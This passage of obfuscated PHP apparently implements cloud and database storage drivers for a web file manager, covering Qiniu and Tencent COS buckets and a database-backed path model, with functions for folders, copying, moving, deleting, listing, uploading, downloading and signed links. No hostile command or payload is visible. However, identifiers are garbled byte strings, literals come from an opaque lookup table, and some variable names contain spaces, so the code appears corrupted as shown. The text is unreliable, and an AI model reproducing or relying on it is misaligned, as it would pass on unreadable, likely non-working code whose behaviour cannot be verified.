($this->setContent($•ÑÄ–´Ù, $™¸ì©Æ)) { return $this->getPathOuter($•ÑÄ–´Ù); } return !1; } public function mkdir($óŠš“Ê, $óÛÂêÉ’ = REPEAT_SKIP) { $×ô¬Õµ® =& $_SERVER[ùèÅ´Ãš]; $è—Äë­÷ = trim($óŠš“Ê, $×ô¬Õµ®[8]); if ($this->_isFolder($è—Äë­÷)) { return $this->getPathOuter($è—Äë­÷); } $óŠš“Ê = $è—Äë­÷ . $×ô¬Õµ®[8]; $¹©æ¥ÙÅ = get_path_this($è—Äë­÷); $íÁ¤†Ù = $óŠš“Ê . $¹©æ¥ÙÅ; if (!$this->mkfile($íÁ¤†Ù)) { return !1; } if (!$this->moveFile($íÁ¤†Ù, $óŠš“Ê)) { $this->delFile($íÁ¤†Ù); return !1; } return $this->getPathOuter($è—Äë­÷); } public function copyFile($ÉƒèÔ²±, $üº¢›°Ö) { $ÃÚ¢Ğ‡Ÿ = $this->bucketManager->copy($this->bucket, $ÉƒèÔ²±, $this->bucket, $üº¢›°Ö, !0); return $ÃÚ¢Ğ‡Ÿ ? !1 : $this->getPathOuter($üº¢›°Ö); } public function moveFile($¸¾ñ†ï‘, $ˆ£† ­) { $¥õ¡Ş½¿ = $this->bucketManager->move($this->bucket, $¸¾ñ†ï‘, $this->bucket, $ˆ£† ­, !0); return $¥õ¡Ş½¿ ? !1 : $this->getPathOuter($ˆ£† ­); } public function delFile($­Ãßı”¬) { if (!$this->exist($­Ãßı”¬)) { return !0; } $Úå½‹Ğº = $this->bucketManager->delete($this->bucket, $­Ãßı”¬); if (!$Úå½‹Ğº) { return !0; } return $Úå½‹Ğº->code() == 612 ? !0 : !1; } public function delFolder($´ÅÔß‹) { $ˆ¬â©Ê =& $_SERVER[ùèÅ´Ãš]; if (!$this->exist($´ÅÔß‹)) { return !0; } $this->listItemCache = !1; $‡×ğ Ì = $this->fileList($´ÅÔß‹); $this->listItemCache = !0; $´ˆ“ÃÅş = trim($´ÅÔß‹, $ˆ¬â©Ê[8]) . $ˆ¬â©Ê[8]; if (!empty($´ÅÔß‹) && $´ÅÔß‹ !== $ˆ¬â©Ê[231] && !in_array($´ˆ“ÃÅş, $‡×ğ Ì[$ˆ¬â©Ê[85]])) { $‡×ğ Ì[$ˆ¬â©Ê[85]][] = $´ˆ“ÃÅş; } $ÌìµÒ¹€ = $this->delByBatch($‡×ğ Ì[$ˆ¬â©Ê[86]]); if (!$ÌìµÒ¹€) { return !1; } $ÌìµÒ¹€ = $this->delByBatch($‡×ğ Ì[$ˆ¬â©Ê[85]]); if (!$ÌìµÒ¹€) { return !1; } return $this->delFile($´ˆ“ÃÅş); } private function delByBatch($Ê¿Òæ©Ç) { foreach (array_chunk($Ê¿Òæ©Ç, 1000) as $ö£ç§üÀ) { $ÃÜÉ›˜Ä = $this->bucketManager->buildBatchDelete($this->bucket, $ö£ç§üÀ); list($š­”Ø½, $üÙ …Û×) = $this->bucketManager->batch($ÃÜÉ›˜Ä); if ($üÙ …Û×) { return !1; } } return !0; } public function rename($·Ìàõª›, $¶–ë—ŒÆ) { return $this->renameObject($·Ìàõª›, $¶–ë—ŒÆ); } public function fileInfo($œ²€ıÖå, $®•áì’€ = false, $Öëš¿§” = array()) { $éµà‚ãä =& $_SERVER[ùèÅ´Ãš]; $ÄÓéïÌ = array($éµà‚ãä[32] => $this->pathThis($œ²€ıÖå), $éµà‚ãä[87] => $this->getPathOuter($éµà‚ãä[8] . $œ²€ıÖå), $éµà‚ãä[33] => $éµà‚ãä[233], $éµà‚ãä[79] => isset($Öëš¿§”[$éµà‚ãä[1551]]) ? $Öëš¿§”[$éµà‚ãä[1551]] : 0, $éµà‚ãä[169] => $this->ext($œ²€ıÖå)); if ($®•áì’€) { return $ÄÓéïÌ; } $ÄÓéïÌ[$éµà‚ãä[234]] = $ÄÓéïÌ[$éµà‚ãä[88]] = 0; $ÄÓéïÌ[$éµà‚ãä[235]] = $ÄÓéïÌ[$éµà‚ãä[236]] = !0; if (empty($Öëš¿§”)) { $Öëš¿§” = $this->objectMeta($œ²€ıÖå); if (!$Öëš¿§”) { return $ÄÓéïÌ; } } if (isset($Öëš¿§”[$éµà‚ãä[237]]) && $Öëš¿§”[$éµà‚ãä[237]]) { $ÄÓéïÌ[$éµà‚ãä[238]] = $Öëš¿§”[$éµà‚ãä[237]]; } if (isset($Öëš¿§”[$éµà‚ãä[248]]) && $Öëš¿§”[$éµà‚ãä[248]]) { $ÄÓéïÌ[$éµà‚ãä[238]] = $Öëš¿§”[$éµà‚ãä[248]]; } if (isset($Öëš¿§”[$éµà‚ãä[1552]])) { $ÄÓéïÌ[$éµà‚ãä[88]] = substr($Öëš¿§”[$éµà‚ãä[1552]] . $éµà‚ãä[12], 0, 10); } if (isset($Öëš¿§”[$éµà‚ãä[1551]])) { $ÄÓéïÌ[$éµà‚ãä[79]] = $Öëš¿§”[$éµà‚ãä[1551]]; } return $ÄÓéïÌ; } public function folderInfo($õĞ­åÅñ, $È¥®…ó = false) { $èé´ïÒ¤ =& $_SERVER[ùèÅ´Ãš]; $İ–³„ê = array($èé´ïÒ¤[32] => $this->pathThis($õĞ­åÅñ), $èé´ïÒ¤[87] => $this->getPathOuter($èé´ïÒ¤[8] . $õĞ­åÅñ), $èé´ïÒ¤[33] => $èé´ïÒ¤[78]); if ($È¥®…ó) { return $İ–³„ê; } $İ–³„ê[$èé´ïÒ¤[234]] = $İ–³„ê[$èé´ïÒ¤[88]] = 0; $İ–³„ê[$èé´ïÒ¤[235]] = $İ–³„ê[$èé´ïÒ¤[236]] = !0; $õĞ­åÅñ = rtrim($õĞ­åÅñ, $èé´ïÒ¤[8]) . $èé´ïÒ¤[8]; $ê•æ³øç = $this->objectMeta($õĞ­åÅñ); if (isset($ê•æ³øç[$èé´ïÒ¤[1552]])) { $İ–³„ê[$èé´ïÒ¤[88]] = substr($ê•æ³øç[$èé´ïÒ¤[1552]] . $èé´ïÒ¤[12], 0, 10); } return $İ–³„ê; } public function listPath($­Ì¿×…«, $îü•š±¾ = false) { $Û•ëúƒ¹ =& $_SERVER[ùèÅ´Ãš]; $µË°°å¬ = $this->fileList($­Ì¿×…«, $Û•ëúƒ¹[8], !0); foreach ($µË°°å¬[$Û•ëúƒ¹[85]] as $èµûÂ®” => $ß€‹‹”) { $µË°°å¬[$Û•ëúƒ¹[85]][$èµûÂ®”] = $this->folderInfo($ß€‹‹”, $îü•š±¾); } foreach ($µË°°å¬[$Û•ëúƒ¹[86]] as $èµûÂ®” => $ß€‹‹”) { $µË°°å¬[$Û•ëúƒ¹[86]][$èµûÂ®”] = $this->fileInfo($ß€‹‹”[$Û•ëúƒ¹[32]], $îü•š±¾, $ß€‹‹”); } return $µË°°å¬; } public function has($œ•¹Ïæ, $Úïåµñ = false, $–ôÂéê = true) { $Ò¤·… • =& $_SERVER[ùèÅ´Ãš]; $œ•¹Ïæ = trim($œ•¹Ïæ, $Ò¤·… •[8]); $çà‚•Ï  = empty($œ•¹Ïæ) && $œ•¹Ïæ !== $Ò¤·… •[231] ? $Ò¤·… •[12] : $œ•¹Ïæ . $Ò¤·… •[8]; $¸“ìÑ™÷ = $Ò¤·… •[12]; $Ïó”¸êé = 500; $ô¥‚½¹û = $Ò¤·… •[8]; $äÑ™ñšô = $¬ïÚ™œé = 0; while (!0) { check_abort(); list($¡ÂÕƒğ, $áÊ’üı÷) = $this->bucketManager->listFiles($this->bucket, $çà‚•Ï , $¸“ìÑ™÷, $Ïó”¸êé, $ô¥‚½¹û); if ($áÊ’üı÷) { break; } $¸“ìÑ™÷ = array_key_exists($Ò¤·… •[1498], $¡ÂÕƒğ) ? $¸“ìÑ™÷ = $¡ÂÕƒğ[$Ò¤·… •[1553]] : $Ò¤·… •[12]; if ($Úïåµñ) { if (!empty($¡ÂÕƒğ[$Ò¤·… •[1554]])) { $äÑ™ñšô += count($¡ÂÕƒğ[$Ò¤·… •[1554]]); } if (!empty($¡ÂÕƒğ[$Ò¤·… •[1555]])) { $¬ïÚ™œé += count($¡ÂÕƒğ[$Ò¤·… •[1555]]); } if ($¸“ìÑ™÷ === $Ò¤·… •[12]) { break; } continue; } if ($–ôÂéê) { if (!empty($¡ÂÕƒğ[$Ò¤·… •[1554]])) { return !0; } } else { if (!empty($¡ÂÕƒğ[$Ò¤·… •[1555]])) { return !0; } } if ($¸“ìÑ™÷ === $Ò¤·… •[12]) { break; } } if ($Úïåµñ) { return array($Ò¤·… •[242] => $äÑ™ñšô, $Ò¤·… •[243] => $¬ïÚ™œé); } return !1; } public function listAll($“õ´ïë¬) { $©Ö™Ê“  =& $_SERVER[ùèÅ´Ãš]; $˜£¡Òâš = $this->fileList($“õ´ïë¬, $©Ö™Ê“ [12], !0); $ÊÀØ©¯— = array_to_keyvalue($˜£¡Òâš[$©Ö™Ê“ [86]], $©Ö™Ê“ [32]); foreach ($˜£¡Òâš[$©Ö™Ê“ [85]] as $äæ¾àòø) { if (is_string($äæ¾àòø)) { $ÊÀØ©¯—[$äæ¾àòø] = array($©Ö™Ê“ [79] => 0); } } return $this->listAllFiles($“õ´ïë¬, $ÊÀØ©¯—); } private function fileList($ÎşÌÇê›, $Ÿä¼şåÎ = '', $ÏÂú¹«¨ = 0) { $öÏ·¼’ =& $_SERVER[ùèÅ´Ãš]; $ÎşÌÇê› = trim($ÎşÌÇê›, $öÏ·¼’[8]); $•ÅàÜ = empty($ÎşÌÇê›) && $ÎşÌÇê› !== $öÏ·¼’[231] ? $öÏ·¼’[12] : $ÎşÌÇê› . $öÏ·¼’[8]; $¨ùÁ™—¹ = $öÏ·¼’[12]; $İˆæ€Ò = 1000; $Îì­“¬³ = $Í±×ü½¤ = array(); while (!0) { check_abort(); list($ÅØŸúÈ†, $¿‚ä­Ö«) = $this->bucketManager->listFiles($this->bucket, $•ÅàÜ, $¨ùÁ™—¹, $İˆæ€Ò, $Ÿä¼şåÎ); if ($¿‚ä­Ö«) { break; } $¨ùÁ™—¹ = array_key_exists($öÏ·¼’[1498], $ÅØŸúÈ†) ? $¨ùÁ™—¹ = $ÅØŸúÈ†[$öÏ·¼’[1553]] : $öÏ·¼’[12]; $ç–Õ¯Ó’ = isset($ÅØŸúÈ†[$öÏ·¼’[1554]]) ? $ÅØŸúÈ†[$öÏ·¼’[1554]] : array(); $î–’ØÁ = isset($ÅØŸúÈ†[$öÏ·¼’[1555]]) ? $ÅØŸúÈ†[$öÏ·¼’[1555]] : array(); foreach ($ç–Õ¯Ó’ as $¶òï¸¯¿) { if ($¶òï¸¯¿[$öÏ·¼’[97]] == $•ÅàÜ) { continue; } $¾´™şú¨ = $¶òï¸¯¿[$öÏ·¼’[97]]; $øå€ğ¢¦ = $¶òï¸¯¿[$öÏ·¼’[1551]]; $¶òï¸¯¿[$öÏ·¼’[32]] = $¾´™şú¨; $¶òï¸¯¿[$öÏ·¼’[79]] = $øå€ğ¢¦; $âìİıÆü = $øå€ğ¢¦ == 0 && substr($¾´™şú¨, strlen($¾´™şú¨) - 1, 1) == $öÏ·¼’[8] ? !0 : !1; $this->cacheMethodInfoSet($¾´™şú¨, $âìİıÆü, $¶òï¸¯¿); if ($âìİıÆü) { $Îì­“¬³[] = $¾´™şú¨; continue; } $Í±×ü½¤[] = $ÏÂú¹«¨ ? $¶òï¸¯¿ : $¾´™şú¨; } foreach ($î–’ØÁ as $¾´™şú¨) { if ($¾´™şú¨ == $•ÅàÜ) { continue; } $Îì­“¬³[] = $¾´™şú¨; $this->cacheMethodInfoSet($¾´™şú¨, !0); } if ($¨ùÁ™—¹ === $öÏ·¼’[12]) { break; } } $this->cacheMethodInfoSet($ÎşÌÇê›, !0); return array($öÏ·¼’[85] => $Îì­“¬³, $öÏ·¼’[86] => $Í±×ü½¤); } public function canRead($º“€Ò) { return $this->exist($º“€Ò) ? !0 : !1; } public function canWrite($ŒŞ”¦«) { return $this->exist($ŒŞ”¦«) ? !0 : !1; } public function getContent($ş´àË“ƒ) { return $this->fileSubstr($ş´àË“ƒ, 0, -1); } public function setContent($Şºø¤ĞÏ, $ô¬Ë–­Ô = '') { $º’œ©´ì = $this->tempFile($this->pathThis($Şºø¤ĞÏ)); file_put_contents($º’œ©´ì, $ô¬Ë–­Ô); if ($this->upload($Şºø¤ĞÏ, $º’œ©´ì)) { $this->tempFileRemve($º’œ©´ì); return !0; } return !1; } public function refreshUrls($ÙµŠ–±Æ) { $ó¨İíÓÚ =& $_SERVER[ùèÅ´Ãš]; $…¬ò×Ä = array(); if (is_array($ÙµŠ–±Æ)) { foreach ($ÙµŠ–±Æ as $ÌÁ»«ÔÁ) { $…¬ò×Ä[] = $this->link($ÌÁ»«ÔÁ); } } else { $…¬ò×Ä[] = $this->link($ÙµŠ–±Æ); } $«»õ„Ê = new Qiniu\Cdn\CdnManager($this->auth); list($¼œ–ŞÂ, $¿ŠÛÛœ©) = $«»õ„Ê->refreshUrls($…¬ò×Ä); if ($¿ŠÛÛœ©) { return !1; } return $¼œ–ŞÂ[$ó¨İíÓÚ[1278]] == $ó¨İíÓÚ[837] ? !0 : !1; } public function fileSubstr($Ö¬«®’´, $ÃÈÌû£, $‹”Ç™àÁ) { $Í‘ğÉ€ã =& $_SERVER[ùèÅ´Ãš]; if (!($…«İã¦™ = $this->link($Ö¬«®’´))) { return !1; } $˜½õ÷ = !1; if ($‹”Ç™àÁ > 0) { $ó‘ƒá = $ÃÈÌû£ + $‹”Ç™àÁ - 1; $˜½õ÷ = array($Í‘ğÉ€ã[1556] . $ÃÈÌû£ . $Í‘ğÉ€ã[464] . $ó‘ƒá); } $áš…Ãé² = url_request($…«İã¦™, $Í‘ğÉ€ã[1517], !1, $˜½õ÷); return $áš…Ãé²[$Í‘ğÉ€ã[827]] ? $áš…Ãé²[$Í‘ğÉ€ã[1301]] : !1; } public function upload($êûá€èà, $¡‰ËáŠå, $ÀØğ·š = false, $¤¢Ú‘ı¥ = REPEAT_REPLACE) { $Ÿ—û„‡µ = new Qiniu\Storage\UploadManager(); $ö†ßÌï» = $this->auth->uploadToken($this->bucket, $êûá€èà); $Ñå‰¥İ = get_file_mime(get_path_ext($¡‰ËáŠå)); list($°·Öñğ, $Ê¹ÙÉ†) = $Ÿ—û„‡µ->putFile($ö†ßÌï», $êûá€èà, $¡‰ËáŠå, null, $Ñå‰¥İ); return $Ê¹ÙÉ† ? !1 : $this->getPathOuter($êûá€èà); } public function uploadFormData($Ïì‰µóà, $±óÇ¿ÎÛ = 3600) { return $this->uploadToken($Ïì‰µóà, $±óÇ¿ÎÛ); } public function uploadMultiData($í™©õ¬, $¯Û­ßªé = 3600) { return $this->uploadToken($í™©õ¬, $¯Û­ßªé); } private function uploadToken($ã“°¯ı, $öÕˆ®óÔ = 3600) { $‘î±òÙø =& $_SERVER[ùèÅ´Ãš]; $ú±•ª«ƒ = $öÕˆ®óÔ; $òè†ÖÓú = array($‘î±òÙø[1557] => $‘î±òÙø[1558]); $ÅÇô¾íÛ = $ã“°¯ı; $ûû³ºĞœ = $this->auth->uploadToken($this->bucket, $ÅÇô¾íÛ, $ú±•ª«ƒ, $òè†ÖÓú, !0); $Û×›†Çñ = empty($this->region) || $this->region == $‘î±òÙø[1559] ? $‘î±òÙø[12] : $‘î±òÙø[464] . $this->region; $Ö‹äˆÕ€ = http_type() . "\72\57\x2f\165\x70\x6c\x6f\x61\144{$Û×›†Çñ}\56\x71\x69\x6e\151\165\160\56\143\157\155\57"; return array($‘î±òÙø[1560] => $ûû³ºĞœ, $‘î±òÙø[1561] => $Ö‹äˆÕ€); } public function download($¨çæ•µå, $§óòğÑÚ) { $Š ƒ™šÅ = IO::getPathInner(IO::mkfile($§óòğÑÚ)); if (!($ûä’‘¯ = $this->link($¨çæ•µå))) { return !1; } $àÜœ¡İ´ = 0; $ÒÛ÷–È = 1024 * 200; $ÈåÃö½Ğ = fopen($Š ƒ™šÅ, $_SERVER[ùèÅ´Ãš][1562]); while (!0) { $ìë³‘Ì÷ = $this->fileSubstr($¨çæ•µå, $àÜœ¡İ´, $ÒÛ÷–È); if ($ìë³‘Ì÷ === !1) { return !1; } fwrite($ÈåÃö½Ğ, $ìë³‘Ì÷); $àÜœ¡İ´ += $ÒÛ÷–È; if (strlen($ìë³‘Ì÷) < $ÒÛ÷–È) { break; } } fclose($ÈåÃö½Ğ); return $§óòğÑÚ; } public function link($ßï‹Ã§µ, $Ø”‘»ô‘ = '') { if (!$this->isFile($ßï‹Ã§µ)) { return !1; } $’ÊÂşß— = $this->getHost() . $_SERVER[ùèÅ´Ãš][8] . $this->pathEncode($ßï‹Ã§µ) . $Ø”‘»ô‘; return $this->auth->privateDownloadUrl($’ÊÂşß—, 3600 * 12); } public function fileOut($¤ÃÆ°Ş, $ØÂÓ±»” = false, $âŸ³ë¶ = false, $Óö×Åø¡ = '') { $ÀŸÉëúé =& $_SERVER[ùèÅ´Ãš]; if ($this->isFileOutServer()) { return $this->fileOutServer($¤ÃÆ°Ş, $ØÂÓ±»”, $âŸ³ë¶, $Óö×Åø¡); } if (!$âŸ³ë¶) { $âŸ³ë¶ = $this->pathThis($¤ÃÆ°Ş); } $Å•’ÊÑ„ = $ØÂÓ±»” ? $ÀŸÉëúé[1563] . rawurlencode($âŸ³ë¶) : $ÀŸÉëúé[12]; $˜ç’ıÛ„ = $this->link($¤ÃÆ°Ş, $Å•’ÊÑ„); $this->fileOutLink($˜ç’ıÛ„); } public function fileOutServer($ªî¥…šœ, $³¶‹ˆĞÀ = false, $ŸßÕç¤Ö = false, $—¦Áë× = '') { parent::fileOut($ªî¥…šœ, $³¶‹ˆĞÀ, $ŸßÕç¤Ö, $—¦Áë×); } public function fileOutImage($ÆöÒŸÍ¨, $„Û’Áà = 250) { if ($this->size($ÆöÒŸÍ¨) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ÆöÒŸÍ¨, $„Û’Áà); } $şˆğö—º = $this->link($ÆöÒŸÍ¨, $_SERVER[ùèÅ´Ãš][1564] . $„Û’Áà); $this->fileOutLink($şˆğö—º); } public function fileOutImageServer($±®µ¤µœ, $›©šÃ² = 250) { parent::fileOutImage($±®µ¤µœ, $›©šÃ²); } public function hashMd5($ßæ¬·ˆÑ) { $ó°ğ¼¸½ =& $_SERVER[ùèÅ´Ãš]; $ËÆ£˜½› = $this->objectMeta($ßæ¬·ˆÑ); return isset($ËÆ£˜½›[$ó°ğ¼¸½[248]]) ? $ËÆ£˜½›[$ó°ğ¼¸½[248]] : !1; $ã¸€êÀˆ = $this->link($ßæ¬·ˆÑ, $ó°ğ¼¸½[1565]); } public function size($œ‚ÎˆñÈ) { $½ş‡²àú = $this->objectMeta($œ‚ÎˆñÈ); return $½ş‡²àú ? $½ş‡²àú[$_SERVER[ùèÅ´Ãš][79]] : 0; } public function info($Ø×“ƒ) { if ($this->isFolder($Ø×“ƒ)) { return $this->folderInfo($Ø×“ƒ); } else { if ($this->isFile($Ø×“ƒ)) { return $this->fileInfo($Ø×“ƒ); } } return !1; } public function exist($Õ€³œÙ¨) { return $this->isFile($Õ€³œÙ¨) || $this->isFolder($Õ€³œÙ¨); } public function isFile($ç¤éöá) { return !$this->isFolder($ç¤éöá) && $this->objectMeta($ç¤éöá); } public function isFolder($óª™ä“²) { return $this->cacheMethod($_SERVER[ùèÅ´Ãš][180], $óª™ä“²); } protected function objectMeta($Ô«üä€—) { return $this->cacheMethod($_SERVER[ùèÅ´Ãš][182], $Ô«üä€—); } protected function _objectMeta($£ŞâŞÕ˜) { $‹„¡¨ı =& $_SERVER[ùèÅ´Ãš]; list($¢õ©Ó­£, $ØÙÚù‰½) = $this->bucketManager->stat($this->bucket, $£ŞâŞÕ˜); if ($¢õ©Ó­£) { $¢õ©Ó­£[$‹„¡¨ı[79]] = intval($¢õ©Ó­£[$‹„¡¨ı[1551]]); } return $¢õ©Ó­£; } protected function _isFolder($Òî©ˆª—) { $ºÖÇ¥“ş =& $_SERVER[ùèÅ´Ãš]; if ($Òî©ˆª— == $ºÖÇ¥“ş[12] || $Òî©ˆª— == $ºÖÇ¥“ş[8]) { return !0; } list($Õ¯Ú˜ø, $ß¬§†û¨) = $this->bucketManager->listFiles($this->bucket, trim($Òî©ˆª—, $ºÖÇ¥“ş[8]) . $ºÖÇ¥“ş[8], $ºÖÇ¥“ş[12], 1, $ºÖÇ¥“ş[8]); return !empty($Õ¯Ú˜ø[$ºÖÇ¥“ş[1554]]) || !empty($Õ¯Ú˜ø[$ºÖÇ¥“ş[1555]]) ? !0 : !1; } } goto Fä·Ç‹¦; b½òÆùäî…: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Œù¬ÖÂª) { parent::__construct($Œù¬ÖÂª); $this->setSignVersion($_SERVER[ùèÅ´Ãš][250]); } public function uploadFormData($˜§Í Ø, $ÚùÁ¬Ü = 3600) { $»šÑÑƒ =& $_SERVER[ùèÅ´Ãš]; $»¢Œßª = $»šÑÑƒ[232]; $ˆú£†™ = $»šÑÑƒ[1433]; $¢ß†Ôïû = $»šÑÑƒ[264]; $á®ìº·‚ = gmdate($»šÑÑƒ[1434], time() + $ÚùÁ¬Ü); $æúÁ—„ = (string) time() . $»šÑÑƒ[74] . (string) (time() + $ÚùÁ¬Ü); $°°çÚÈ¦ = array($»šÑÑƒ[265] => $á®ìº·‚, $»šÑÑƒ[268] => array(array($»šÑÑƒ[309] => $»¢Œßª), array($»šÑÑƒ[269] => $this->bucket), array($»šÑÑƒ[270], $»šÑÑƒ[271], $»šÑÑƒ[12]), array($»šÑÑƒ[273] => $¢ß†Ôïû), array($»šÑÑƒ[1435] => $ˆú£†™), array($»šÑÑƒ[1436] => $this->accessKey), array($»šÑÑƒ[1437] => $æúÁ—„))); $°°çÚÈ¦ = json_encode($°°çÚÈ¦); $¸ğôÙ­ä = hash_hmac($»šÑÑƒ[1433], $æúÁ—„, $this->secret); $½ôµöÛÚ = sha1($°°çÚÈ¦); $Ê–úâÁç = hash_hmac($»šÑÑƒ[1433], $½ôµöÛÚ, $¸ğôÙ­ä); $½ŠÆÁ¿­ = array($»šÑÑƒ[309] => $»¢Œßª, $»šÑÑƒ[273] => $¢ß†Ôïû, $»šÑÑƒ[280] => base64_encode($°°çÚÈ¦), $»šÑÑƒ[1435] => $ˆú£†™, $»šÑÑƒ[1436] => $this->accessKey, $»šÑÑƒ[1438] => $æúÁ—„, $»šÑÑƒ[1439] => $Ê–úâÁç, $»šÑÑƒ[209] => $this->getHost()); return $½ŠÆÁ¿­; } public function fileOutImage($úãÕŞã£, $ş‹Íö…À = 250) { $£û¸ÕÙ =& $_SERVER[ùèÅ´Ãš]; if ($this->size($úãÕŞã£) > 1024 * 1024 * 32) { return $this->fileOutImageServer($úãÕŞã£, $ş‹Íö…À); } $ŠŸ´Ì¶ì = $this->link($úãÕŞã£); $ŠŸ´Ì¶ì .= $£û¸ÕÙ[1440] . $ş‹Íö…À . $£û¸ÕÙ[1441]; $this->fileOutLink($ŠŸ´Ì¶ì); } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ÂØÔ³‰˜) { $this->pathParse = $ÂØÔ³‰˜; $this->model = Model($_SERVER[ùèÅ´Ãš][1442]); } public function getPath($×À¬ëĞƒ) { return trim($×À¬ëĞƒ, $_SERVER[ùèÅ´Ãš][8]); } public function pathFather($ÁëÓÃû‚) { $ºâˆâÑ« = $this->parse($ÁëÓÃû‚); $ºâˆâÑ« = $this->infoSimple($ÁëÓÃû‚); return $ºâˆâÑ« ? $ºâˆâÑ«[$_SERVER[ùèÅ´Ãš][193]] : !1; } public function pathThis($¥³›Ô¯¼) { $ı¶‘©™› = $this->infoSimple($¥³›Ô¯¼); return $ı¶‘©™› ? $ı¶‘©™›[$_SERVER[ùèÅ´Ãš][32]] : !1; } public function getPathOuter($¦Ê¥úÔ¬) { if (!$¦Ê¥úÔ¬) { return $¦Ê¥úÔ¬; } $§©˜ ¸ˆ = $this->parse($¦Ê¥úÔ¬); return KodIO::make($§©˜ ¸ˆ[$_SERVER[ùèÅ´Ãš][477]]); } public function copyFolderFromIO($ÒÛæ™Ë‘, $·ĞßÃÂ‰, $ÜÄÑ³³¬, $¨äñ¸Ğ, $é‰Šèùé) { $æß°¬¡ˆ = $this->model->copyFolderFromIO($ÒÛæ™Ë‘, $·ĞßÃÂ‰, $ÜÄÑ³³¬, $¨äñ¸Ğ, $é‰Šèùé); return KodIO::make($æß°¬¡ˆ); } public function isParentOf($Ê„Ã³Á, $¨ù–¬ôÜ) { return $this->model->isParentOf($Ê„Ã³Á, $¨ù–¬ôÜ); } public function mkfile($Ö„­È÷, $½óâ‹Ğí = '', $ä¯š¶º‘ = REPEAT_RENAME) { $ŒËôì°è =& $_SERVER[ùèÅ´Ãš]; $’ÛåÛ” = $this->parse($Ö„­È÷); $Ö„­È÷ = $’ÛåÛ”[$ŒËôì°è[477]]; for ($Îåõõ†Í = 0; $Îåõõ†Í < count($’ÛåÛ”[$ŒËôì°è[1443]]); $Îåõõ†Í++) { $€ÙúÜî“ = $’ÛåÛ”[$ŒËôì°è[1443]][$Îåõõ†Í]; if ($Îåõõ†Í == count($’ÛåÛ”[$ŒËôì°è[1443]]) - 1) { $Ö„­È÷ = $this->model->mkfile($Ö„­È÷, $€ÙúÜî“, $½óâ‹Ğí, $ä¯š¶º‘); break; } $Ö„­È÷ = $this->model->mkdir($Ö„­È÷, $€ÙúÜî“, REPEAT_SKIP); } return $this->getPathOuter($Ö„­È÷); } public function mkdir($ášãóÄ÷, $²Ê†üŒ… = REPEAT_SKIP) { $­×ä•Ü— =& $_SERVER[ùèÅ´Ãš]; $Ÿõë®“ô = $this->parse($ášãóÄ÷); $ášãóÄ÷ = $Ÿõë®“ô[$­×ä•Ü—[477]]; for ($Şó•Ô¢ = 0; $Şó•Ô¢ < count($Ÿõë®“ô[$­×ä•Ü—[1443]]); $Şó•Ô¢++) { $»·¥¸µ = $Ÿõë®“ô[$­×ä•Ü—[1443]][$Şó•Ô¢]; $ášãóÄ÷ = $this->model->mkdir($ášãóÄ÷, $»·¥¸µ, $²Ê†üŒ…); } return $this->getPathOuter($ášãóÄ÷); } public function copyFile($áá±àâ, $…ñùçĞ, $¢È›¥Ã§ = REPEAT_REPLACE) { $Çıá¡‚‚ =& $_SERVER[ùèÅ´Ãš]; $˜²Õã™´ = $this->parse($…ñùçĞ); $ÅŸš±ü = $this->model->copy($áá±àâ, $˜²Õã™´[$Çıá¡‚‚[477]], $¢È›¥Ã§, $˜²Õã™´[$Çıá¡‚‚[87]]); return $ÅŸš±ü ? $this->getPathOuter($ÅŸš±ü) : !1; } public function moveFile($úì®ˆ¡ò, $Š¯äşè·, $ô€¦ã§ = REPEAT_REPLACE) { $îõæªÏ =& $_SERVER[ùèÅ´Ãš]; $ºù£ê¡ø = $this->parse($Š¯äşè·); $è¿ÏçŠÅ = $this->model->move($úì®ˆ¡ò, $ºù£ê¡ø[$îõæªÏ[477]], $ô€¦ã§, $ºù£ê¡ø[$îõæªÏ[87]]); return $è¿ÏçŠÅ ? $this->getPathOuter($è¿ÏçŠÅ) : !1; } public function copy($µ€ä¤Ô›, $î™’Î£ã, $ªóö¼° = REPEAT_REPLACE, $ËåÚ•Ç‚ = false) { $€Ì‚½¯£ = $this->parse($î™’Î£ã); $º¨ˆä„” = $this->model->copy($µ€ä¤Ô›, $€Ì‚½¯£[$_SERVER[ùèÅ´Ãš][477]], $ªóö¼°, $ËåÚ•Ç‚); return $º¨ˆä„” ? $this->getPathOuter($º¨ˆä„”) : !1; } public function moveSameAllow() { } public function move($éî×ËŠ›, $ü÷‰²ˆ”, $ãø°à² = REPEAT_REPLACE, $„ÕÑÄŸÔ = false) { $å¬ÙéÚİ = $this->parse($ü÷‰²ˆ”); $•ùŞ»øÍ = $this->model->move($éî×ËŠ›, $å¬ÙéÚİ[$_SERVER[ùèÅ´Ãš][477]], $ãø°à², $„ÕÑÄŸÔ); return $•ùŞ»øÍ ? $this->getPathOuter($•ùŞ»øÍ) : !1; } public function remove($ÏëÅ¾…¶, $§Öë”è = true) { return $this->model->remove($ÏëÅ¾…¶, $§Öë”è); } public function rename($æÒÀşƒ½, $éË…ı‹›) { $¨…¬Ì‘ = $this->model->rename($æÒÀşƒ½, $éË…ı‹›); return $¨…¬Ì‘ ? $this->getPathOuter($æÒÀşƒ½) : $¨…¬Ì‘; } public function size($ÇáîøÎî) { $ğüÑà‚‹ = $this->infoSimple($ÇáîøÎî); return $ğüÑà‚‹ ? $ğüÑà‚‹[$_SERVER[ùèÅ´Ãš][79]] : 0; } public function infoSimple($ë·´õ—) { return $this->model->sourceInfo($ë·´õ—); } public function info($Ï©Â—€š) { return $this->infoParse($Ï©Â—€š); } public function infoAuth($µœ§Ú”) { return $this->infoParse($µœ§Ú”, !1, !0); } public function infoWithChildren($ˆàÏ×òÄ) { return $this->infoParse($ˆàÏ×òÄ, !0); } protected function infoParse($ÏìÓ¦Ü€, $·¸Åëæ• = false, $ÙÓ•äœ‰ = false) { if (!$·¸Åëæ•) { return $this->model->pathInfo($ÏìÓ¦Ü€, $ÙÓ•äœ‰); } return $this->model->pathInfoMore($ÏìÓ¦Ü€); } public function infoFullSimple($Ô°÷‰­) { $®¹‹ÌÖğ =& $_SERVER[ùèÅ´Ãš]; $ ¼Ì€õµ = explode($®¹‹ÌÖğ[8], $Ô°÷‰­); $ƒàÙ“» = implode($®¹‹ÌÖğ[8], array_splice($ ¼Ì€õµ, 1)); return $this->model->pathInfoByPath($ ¼Ì€õµ[0], $ƒàÙ“»); } public function infoFull($Ÿë±Üˆ) { $ôÁ“ö¹ò = $this->infoFullSimple($Ÿë±Üˆ); return is_array($ôÁ“ö¹ò) ? 